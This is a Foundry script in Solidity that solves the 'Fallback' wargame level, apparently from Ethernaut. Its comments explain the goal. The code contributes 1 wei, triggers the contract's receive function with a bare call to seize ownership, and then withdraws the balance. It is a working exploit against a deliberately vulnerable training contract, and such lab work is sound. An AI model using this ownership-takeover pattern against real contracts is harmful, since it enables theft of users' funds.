//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Goal:
// you claim ownership of the contract
// you reduce its balance to 0

//Solution
// Owner already contributed 1 ether so we will never be the owner by using the contribution function-not enough funds.We only use it to become a contributor .
// However we can beat the receive logic and the only way to call receive() is by doing a low level call with empty data
// This makes us the new owner and now we can withdraw the funds

import {Fallback} from "../src/Fallback.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/Test.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance =
        Fallback(payable(0x13465450973D391f657e89E145133D92fDe89E8E));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        console.log("New Owner: ", fallbackInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}
